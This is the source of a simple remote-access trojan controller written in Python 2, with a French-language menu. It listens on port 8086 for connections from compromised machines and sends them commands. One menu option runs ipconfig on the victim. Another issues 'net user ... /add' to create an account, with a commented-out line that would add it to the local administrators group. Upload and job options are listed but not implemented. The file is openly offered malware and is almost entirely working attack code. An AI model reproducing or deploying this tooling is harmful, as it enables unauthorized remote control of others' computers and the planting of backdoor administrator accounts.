#####################################################################
# Trojean
# 0/02/2017
# JO
#####################################################################

import socket
import threading

# socket creation
bind_ip = "0.0.0.0"
bind_port = 8086

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(5)

# listening
print "############### SIMPLE TROJAN PYTHON #######################"
print "############### @author - Jerome Themee - security analyst #"
print "################### @date - 16/07/2015 #####################\n"

print "[*] Trojan ok - listening on %s:%d" % (bind_ip, bind_port)  # say hi !


def handle_client(client_socket):
    while True:
        # go to the choice list
        print "[*] What would you like to do ?\n"
        print "[*] 1 pour ipconfig"
        print "[*] 2 pour creation administrateur"
        print "[*] 3 pour importer un fichier "
        print "[*] 4 pour lancer un job"
        choiseTrojan = raw_input("[waiting for your choice] 1 - 2 - 3 - 4 : ")

        if choiseTrojan == "1":
            client_socket.sendall("ipconfig")
            # print the client data
            request = client_socket.recv(2048)
            print "[*] Received: %s\n" % request

        if choiseTrojan == "2":

            adm = raw_input("Login : ")
            pwd = raw_input("mot de passe : ")
            reponse1 = "net user " + adm + " " + pwd + " /add"
            reponse2 = "net localgroup administrateurs" +" "+ adm +" /add"
            print reponse1
            #print reponse2
            client_socket.sendall(reponse1)
            #client_socket.sendall(reponse2)

            # print the client data
            request = client_socket.recv(2048)
            print "[*] Received: %s\n" % request


# loop for waiting connections
while True:
    client, addr = server.accept()
    print "[*] Accepted connection from %s:%d" % (addr[0], addr[1])
    # threading started
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()